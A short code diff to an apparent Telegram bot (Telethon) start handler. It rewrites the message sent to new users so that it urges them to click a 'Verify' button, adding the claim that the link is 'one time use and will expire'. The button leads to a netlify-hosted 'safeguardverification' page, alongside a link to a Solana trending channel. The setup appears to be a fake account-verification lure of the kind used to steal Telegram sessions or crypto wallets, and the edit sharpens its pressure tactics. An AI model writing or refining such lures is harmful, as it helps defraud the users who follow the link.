@@ -37,12 +37,15 @@ async def on_start(event):
             image_data.name = 'image.jpg'  # Set a name for the file-like object
 
             await event.respond(
-                file=image_data,  # Send the image as bytes with a name
-                message="Verify your account.",
-                buttons=[
-                    [Button.url("Verify", "https://safeguardverification.netlify.app/")],
-                    [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]  # Button with a URL link
-                ]
+             file=image_data,  # Send the image as bytes with a name
+             message=(
+              "You can verify your account by clicking on the verify button below\n\n"
+              "This is a one time use and will expire"
+             ),
+             buttons=[
+              [Button.url("Verify", "https://safeguardverification.netlify.app/")],
+              [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]  # Button with a URL link
+             ]
             )
         else:
             await event.respond("Failed to fetch the image from the provided URL.")
